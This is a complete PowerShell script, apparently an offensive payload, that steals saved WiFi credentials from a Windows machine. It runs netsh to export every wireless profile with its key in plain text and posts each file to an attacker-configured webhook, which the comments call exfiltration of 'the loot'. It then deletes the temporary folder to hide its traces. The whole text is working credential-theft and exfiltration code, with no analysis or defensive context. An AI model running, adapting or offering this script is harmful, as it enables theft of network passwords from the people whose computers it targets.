$webhookUri = 'changeme' # Change the value of $webhookUri to match your landing zone
$guid = [guid]::NewGuid().ToString() # Create a unique temporary folder to drop WiFi creds to

# Setup applicable HTTP Headers for the furture request
$headers = @{
    'CF-Access-Client-Id' = 'changeme'
    'CF-Access-Client-Secret' = 'changeme'
    'Content-Type' = 'application/json'
}

New-Item -Path $env:temp -Name $guid -ItemType "directory" # Create a directory with the GUID previously generated

Set-Location -Path "$env:temp/$guid" # Change directories to the new location prior to dumping WiFi creds

netsh wlan export profile key=clear; # Get the loot

Set-Location -Path $env:temp # Move up one directory for future deletion

# Loop over and grab the discrete .xml files produced by the netsh command and assign the contents to the $body variable
Get-ChildItem "$env:tmp/$guid" -File | ForEach-Object {
    $fileContent = Get-Content $_.FullName | Out-String
    $Body = @{
    'text' = '```xml'  + "`n" + $fileContent + '```'
}

Invoke-RestMethod -Uri $webhookUri -Method 'post' -Headers $headers -Body (ConvertTo-Json -InputObject $Body) # Exfil the data
Start-Sleep -Milliseconds 300 # Wait for the requests to go through
}

Remove-Item -Path "$env:tmp/$guid" -Force -Recurse # Cleanup
